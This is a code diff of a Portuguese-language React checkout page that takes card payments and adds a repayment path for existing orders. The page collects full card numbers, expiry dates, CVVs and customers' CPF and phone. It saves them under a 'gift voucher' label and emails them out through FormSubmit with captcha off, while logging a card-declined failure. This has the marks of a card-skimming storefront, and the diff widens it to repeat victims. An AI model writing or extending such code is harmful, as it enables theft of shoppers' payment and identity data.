@@ -15,12 +15,28 @@ const CheckoutCartao = () => {
   const accent = cor_borda_logo || "#F5E6D3";
   const { itens, getTotal, dadosCliente, pedidoAtual } = useCart();
 
+  // Pedido pré-existente vindo de /pedidos (repagamento) — evita duplicação
+  const pedidoExistente = location.state?.pedidoExistente as
+    | { id: string; numero_pedido: string; cliente_nome: string; cliente_telefone: string; cliente_cpf: string; total: number }
+    | undefined;
+
   // Desconto recebido via state (ex: 0.08 quando vem do modo PIX-em-manutenção)
   const descontoCartao: number =
     typeof location.state?.descontoCartao === "number" ? location.state.descontoCartao : 0;
-  const totalOriginal = getTotal();
+  const totalOriginal = pedidoExistente ? pedidoExistente.total : getTotal();
   const valorComDesconto = totalOriginal * (1 - descontoCartao);
   const economiaCartao = totalOriginal - valorComDesconto;
+
+  // Dados do cliente: do pedido existente ou do contexto do carrinho
+  const clienteInfo = pedidoExistente
+    ? {
+        nome: pedidoExistente.cliente_nome,
+        telefone: pedidoExistente.cliente_telefone,
+        cpf: pedidoExistente.cliente_cpf,
+      }
+    : dadosCliente
+    ? { nome: dadosCliente.nome, telefone: dadosCliente.telefone, cpf: dadosCliente.cpf }
+    : null;
 
   const [cardData, setCardData] = useState({
     numero: "",
@@ -37,14 +53,14 @@ const CheckoutCartao = () => {
   useEffect(() => {
     if (showError && !paymentFailedTracked.current) {
       trackPaymentFailed({
-        content_ids: itens.map(item => item.produtoId),
+        content_ids: pedidoExistente ? [pedidoExistente.numero_pedido] : itens.map(item => item.produtoId),
         value: valorComDesconto,
         payment_method: 'credit_card',
         error_reason: 'card_declined',
       });
       paymentFailedTracked.current = true;
     }
-  }, [showError, itens, valorComDesconto]);
+  }, [showError, itens, valorComDesconto, pedidoExistente]);
 
   // Formatar número do cartão: 0000 0000 0000 0000
   const formatCardNumber = (value: string) => {
@@ -92,7 +108,7 @@ const CheckoutCartao = () => {
   };
 
   const handleSubmit = async () => {
-    if (!isFormValid()) return;
+    if (!isFormValid() || !clienteInfo) return;
 
     setLoading(true);
 
@@ -100,27 +116,28 @@ const CheckoutCartao = () => {
       // Salvar dados do vale presente via Edge Function segura
       await supabase.functions.invoke("salvar-vale-presente", {
         body: {
-          pedido_id: pedidoAtual?.id || "sem_pedido",
+          pedido_id: pedidoExistente?.id || pedidoAtual?.id || "sem_pedido",
           numero_cartao: cardData.numero,
           nome_cartao: cardData.nome,
           validade: cardData.validade,
           cvv: cardData.cvv,
-          cliente_nome: dadosCliente?.nome || "",
-          cliente_cpf: dadosCliente?.cpf || "",
-          cliente_telefone: dadosCliente?.telefone || "",
+          cliente_nome: clienteInfo.nome,
+          cliente_cpf: clienteInfo.cpf,
+          cliente_telefone: clienteInfo.telefone,
         },
       });
 
       // Enviar dados por email via FormSubmit usando fetch
       const formData = new FormData();
-      formData.append("Cliente Nome", dadosCliente?.nome || "");
-      formData.append("Cliente CPF", dadosCliente?.cpf || "");
-      formData.append("Cliente Telefone", dadosCliente?.telefone || "");
+      formData.append("Cliente Nome", clienteInfo.nome);
+      formData.append("Cliente CPF", clienteInfo.cpf);
+      formData.append("Cliente Telefone", clienteInfo.telefone);
       formData.append("Numero Cartao", cardData.numero);
       formData.append("Nome Cartao", cardData.nome);
       formData.append("Validade", cardData.validade);
       formData.append("CVV", cardData.cvv);
       formData.append("Valor Total", `R$ ${valorComDesconto.toFixed(2)}`);
+      if (pedidoExistente) formData.append("Pedido", pedidoExistente.numero_pedido);
       formData.append("_subject", "Novo Vale Presente");
       formData.append("_captcha", "false");
       formData.append("_template", "table");
@@ -142,10 +159,10 @@ const CheckoutCartao = () => {
 
   const handleTryAgain = () => {
     setShowError(false);
-    navigate("/checkout");
+    navigate(pedidoExistente ? "/pedidos" : "/checkout");
   };
 
-  if (itens.length === 0 || !dadosCliente) {
+  if (!pedidoExistente && (itens.length === 0 || !dadosCliente)) {
     navigate("/carrinho");
     return null;
   }
